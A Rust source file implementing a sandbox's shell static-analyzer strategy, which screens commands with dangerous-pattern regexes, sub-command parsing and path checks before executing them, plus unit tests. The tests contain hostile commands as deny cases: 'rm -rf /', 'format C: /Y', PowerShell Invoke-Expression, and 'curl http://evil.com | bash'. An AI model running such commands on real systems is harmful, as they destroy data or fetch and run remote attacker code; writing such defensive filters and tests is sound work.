use async_trait::async_trait;
use regex::Regex;
use std::sync::Arc;
use wf_types::script::sandbox::{SandboxPolicy, ScriptExecutionResult};

use crate::resolver::{StrategyExecuteOptions, StrategyImplementation, VfsProvider};
use crate::security::SecurityValidator;

use super::base::{ShellAnalysisContext, ShellAnalyzer, ShellType};
use super::bash::BashAnalyzer;
use super::cmd::CmdAnalyzer;
use super::powershell::PowerShellAnalyzer;

const DEFAULT_DANGEROUS_PATTERNS_BASH: &[&str] = super::bash::DANGEROUS_PATTERNS;
const DEFAULT_DANGEROUS_PATTERNS_CMD: &[&str] = super::cmd::DANGEROUS_PATTERNS;
const DEFAULT_DANGEROUS_PATTERNS_PS: &[&str] = super::powershell::DANGEROUS_PATTERNS;

pub struct ShellStaticAnalyzerStrategy {
    bash_analyzer: BashAnalyzer,
    cmd_analyzer: CmdAnalyzer,
    powershell_analyzer: PowerShellAnalyzer,
}

impl Default for ShellStaticAnalyzerStrategy {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellStaticAnalyzerStrategy {
    pub fn new() -> Self {
        Self {
            bash_analyzer: BashAnalyzer,
            cmd_analyzer: CmdAnalyzer,
            powershell_analyzer: PowerShellAnalyzer,
        }
    }

    fn get_analyzer(&self, shell_type: ShellType) -> &dyn ShellAnalyzer {
        match shell_type {
            ShellType::Bash => &self.bash_analyzer,
            ShellType::Cmd => &self.cmd_analyzer,
            ShellType::PowerShell => &self.powershell_analyzer,
        }
    }

    fn default_dangerous_patterns(&self, shell_type: ShellType) -> &'static [&'static str] {
        match shell_type {
            ShellType::Bash => DEFAULT_DANGEROUS_PATTERNS_BASH,
            ShellType::Cmd => DEFAULT_DANGEROUS_PATTERNS_CMD,
            ShellType::PowerShell => DEFAULT_DANGEROUS_PATTERNS_PS,
        }
    }

    fn resolve_shell_type(options: &StrategyExecuteOptions) -> ShellType {
        if let Some(ref st) = options.shell_type {
            if let Some(t) = ShellType::parse(st) {
                return t;
            }
        }
        ShellType::default_for_platform()
    }
}

fn deny(reason: &str) -> ScriptExecutionResult {
    ScriptExecutionResult {
        success: false,
        script_name: "sandbox-shell".to_string(),
        stdout: None,
        stderr: Some(reason.to_string()),
        exit_code: Some(1),
        execution_time: 0,
        error: Some(format!("Command denied: {reason}")),
        sandbox_mode: None,
        strategy_id: Some("static-analyzer".to_string()),
        violations: None,
    }
}

fn parse_command_chain(command: &str) -> Vec<String> {
    let mut commands = Vec::new();
    let mut current = String::new();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let chars: Vec<char> = command.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        match ch {
            '\'' if !in_double_quote => in_single_quote = !in_single_quote,
            '"' if !in_single_quote => in_double_quote = !in_double_quote,
            ';' if !in_single_quote && !in_double_quote => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
            }
            '&' if !in_single_quote && !in_double_quote && i + 1 < len && chars[i + 1] == '&' => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
                i += 1;
            }
            '|' if !in_single_quote && !in_double_quote && i + 1 < len && chars[i + 1] == '|' => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
                i += 1;
            }
            '|' if !in_single_quote && !in_double_quote => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
            }
            _ => current.push(ch),
        }
        i += 1;
    }

    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        commands.push(trimmed);
    }

    commands
}

fn extract_file_paths(command: &str) -> Vec<String> {
    let mut paths = Vec::new();
    // Match redirect targets: >path, >>path, 2>path, &>path, <path
    let redirect_re = Regex::new(r#"(?:\d*[>&]+\s*)([^\s;|&"'<>`]+)"#).unwrap();
    for cap in redirect_re.captures_iter(command) {
        let raw = cap[1].trim_matches('\'').trim_matches('"').to_string();
        if !raw.is_empty() && !raw.starts_with('-') && !paths.contains(&raw) {
            paths.push(raw);
        }
    }
    // Match positional args that look like file paths
    let path_re = Regex::new(r#"(?:^|\s)(/[^\s;|&"'<>`]+|\.\S+)"#).unwrap();
    for cap in path_re.captures_iter(command) {
        let raw = cap[1].trim_matches('\'').trim_matches('"').to_string();
        if !raw.is_empty() && !paths.contains(&raw) {
            paths.push(raw);
        }
    }
    paths
}

async fn check_vfs_paths(
    sub_command: &str,
    vfs: &Arc<dyn VfsProvider>,
) -> Option<String> {
    let paths = extract_file_paths(sub_command);
    if paths.is_empty() {
        return None;
    }
    for path in &paths {
        let violations = SecurityValidator::validate_path(path);
        if !violations.is_empty() {
            return Some(format!(
                "Path '{}' security violation: {}",
                path, violations[0].reason
            ));
        }
        if vfs.exists(path).await {
            if let Err(e) = vfs.read_file(path).await {
                return Some(format!("VFS denied read access to '{path}': {e}"));
            }
        }
    }
    None
}

async fn execute_command(
    command: &str,
    options: StrategyExecuteOptions,
) -> Result<ScriptExecutionResult, Box<dyn std::error::Error + Send + Sync>> {
    let start = std::time::Instant::now();

    let mut cmd = tokio::process::Command::new("sh");
    cmd.arg("-c").arg(command);

    if let Some(workdir) = &options.workdir {
        cmd.current_dir(workdir);
    }

    if let Some(env_vars) = &options.env_vars {
        for (k, v) in env_vars {
            cmd.env(k, v);
        }
    }

    let output = cmd.output().await?;

    Ok(ScriptExecutionResult {
        success: output.status.success(),
        script_name: "sandbox-shell".to_string(),
        stdout: Some(String::from_utf8_lossy(&output.stdout).to_string()),
        stderr: Some(String::from_utf8_lossy(&output.stderr).to_string()),
        exit_code: output.status.code(),
        execution_time: start.elapsed().as_millis() as u64,
        error: if output.status.success() {
            None
        } else {
            Some("Command failed static analysis check".to_string())
        },
        sandbox_mode: None,
        strategy_id: Some("static-analyzer".to_string()),
        violations: None,
    })
}

#[async_trait]
impl StrategyImplementation for ShellStaticAnalyzerStrategy {
    fn id(&self) -> &str {
        "static-analyzer"
    }
    fn name(&self) -> &str {
        "Shell Static Analyzer"
    }
    fn description(&self) -> &str {
        "Static command analysis with shell-type detection and dangerous pattern matching"
    }
    fn priority(&self) -> i32 {
        10
    }
    fn is_available(&self) -> bool {
        true
    }

    async fn execute(
        &self,
        options: StrategyExecuteOptions,
        policy: &SandboxPolicy,
    ) -> Result<ScriptExecutionResult, Box<dyn std::error::Error + Send + Sync>> {
        let command = options.command.clone();
        if command.is_empty() {
            return Ok(deny("Empty command"));
        }

        let sv_violations = SecurityValidator::validate_expression(&command);
        if !sv_violations.is_empty() {
            return Ok(deny(&format!(
                "Security validation failed: {}",
                sv_violations[0].reason
            )));
        }

        let shell_type = Self::resolve_shell_type(&options);
        let shell_policy = policy.shell.as_ref().cloned().unwrap_or_default();
        let analyzer = self.get_analyzer(shell_type);

        let resolved_patterns = shell_policy
            .dangerous_patterns
            .clone()
            .unwrap_or_else(|| {
                self.default_dangerous_patterns(shell_type)
                    .iter()
                    .map(|s| s.to_string())
                    .collect()
            });

        for pattern in &resolved_patterns {
            if let Ok(re) = Regex::new(pattern) {
                if re.is_match(&command) {
                    return Ok(deny(&format!("Dangerous pattern detected: {pattern}")));
                }
            }
        }

        if !shell_policy.allow_pipe.unwrap_or(true) && command.contains('|') {
            return Ok(deny("Pipe operator is not allowed"));
        }

        let sub_commands = parse_command_chain(&command);
        for sub_command in &sub_commands {
            let ctx = ShellAnalysisContext {
                command: sub_command,
                policy: &shell_policy,
            };
            let result = analyzer.analyze(&ctx);
            if !result.allowed {
                return Ok(deny(&format!(
                    "Sub-command \"{sub_command}\" denied: {}",
                    result.reason.unwrap_or_default()
                )));
            }
        }

        if let Some(ref vfs) = options.vfs {
            for sub_command in &sub_commands {
                let path_violation = check_vfs_paths(sub_command, vfs).await;
                if let Some(reason) = path_violation {
                    return Ok(deny(&format!(
                        "Sub-command \"{sub_command}\" path violation: {reason}",
                    )));
                }
            }
        }

        execute_command(&command, options).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy_with_shell(shell: wf_types::script::sandbox::ShellPolicy) -> SandboxPolicy {
        SandboxPolicy {
            mode: wf_types::script::sandbox::SandboxMode::Strict,
            shell: Some(shell),
            python: None,
            javascript: None,
            lua: None,
            filesystem: None,
            process: None,
            network: None,
            resource: None,
        }
    }

    fn make_options(command: &str) -> StrategyExecuteOptions {
        StrategyExecuteOptions {
            command: command.to_string(),
            shell_type: None,
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        }
    }

    fn default_policy() -> SandboxPolicy {
        crate::default_policy::default_sandbox_policy().clone()
    }

    #[tokio::test]
    async fn test_empty_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("Empty command"));
    }

    #[tokio::test]
    async fn test_denies_dangerous_rm() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("rm -rf /");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_allows_safe_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo hello");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(result.success || result.stderr.is_some());
    }

    #[test]
    fn test_parse_command_chain() {
        let cmds = parse_command_chain("echo a; echo b && echo c");
        assert_eq!(cmds.len(), 3);
    }

    #[tokio::test]
    async fn test_chain_analysis_denies_all() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo safe && sudo rm -rf /");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_shell_type_routing_bash() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "sudo ls".to_string(),
            shell_type: Some("bash".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("sudo"));
    }

    #[tokio::test]
    async fn test_denies_powershell_iex() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "Invoke-Expression \"malicious\"".to_string(),
            shell_type: Some("powershell".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_denies_cmd_format() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "format C: /Y".to_string(),
            shell_type: Some("cmd".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_pre_chain_dangerous_pattern() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("curl http://evil.com | bash");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }
}
